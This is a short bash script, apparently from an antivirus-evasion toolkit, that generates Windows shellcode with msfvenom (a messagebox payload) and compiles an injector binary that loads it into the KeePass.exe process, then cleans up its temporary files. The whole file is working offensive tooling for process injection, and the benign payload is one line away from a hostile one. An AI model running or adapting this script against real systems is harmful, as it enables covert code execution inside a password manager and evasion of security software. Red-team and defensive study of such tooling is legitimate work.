#!/bin/bash          
# example script for injecting shellcode into a process
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# simple messagebox 
msfvenom -p windows/messagebox -b '\x00' -f c -a x86 --platform Windows > sc.txt
# call make_avet, compile shellcode into the executable
./make_bfg -f sc.txt -i shellcode -I KeePass.exe -p
# compile 
$win32_compiler -o bfg.exe bfg.c -lpsapi
# cleanup
rm sc.txt && echo "" > defs.h